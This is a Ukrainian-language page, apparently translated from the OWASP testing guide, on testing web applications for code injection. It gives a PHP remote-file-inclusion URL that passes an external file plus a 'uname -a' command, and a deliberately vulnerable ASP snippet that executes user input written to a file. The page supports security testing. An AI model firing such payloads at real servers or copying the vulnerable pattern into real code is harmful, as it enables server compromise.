# Тестування на ін'єкції коду

## Підсумок

У цьому розділі описано, як тестувальник може перевірити, чи можна ввести код як вхідні дані на веб-сторінці та виконати його веб-сервером.

Під час тестування за допомогою [ін'єкції коду](https://owasp.org/www-community/attacks/Code_Injection) тестувальник надсилає вхідні дані, які обробляються веб-сервером як динамічний код або як включений файл. Ці тести можуть бути націлені на різні механізми сценаріїв на стороні сервера, наприклад, ASP або PHP. Для захисту від цих атак необхідно застосувати належну перевірку введених даних і безпечне кодування.
## Мета тестуваннь
- Визначити точки ін’єкції, де ви можете ін’єктувати код у програму.
- Оцінка ступені тяжкості ін'єкції.

## Як тестувати
### Тестування чорної скриньки
#### Тестування вразливостей PHP Injection
Використовуючи рядок запиту, тестувальник може ввести код (у цьому прикладі шкідливу URL-адресу), який буде оброблено як частину включеного файлу:
```
http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
```
*Шкідлива URL-адреса приймається як параметр для сторінки PHP, яка пізніше використовуватиме значення у включеному файлі.*

### Тестування cірої скриньки
#### Тестування вразливостей впровадження коду ASP

Вивчіть код ASP для введення користувачами, що використовується у функціях виконання. Чи може користувач вводити команди в поле вводу даних? Тут код ASP збереже вхідні дані у файл, а потім виконає його:
```
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```
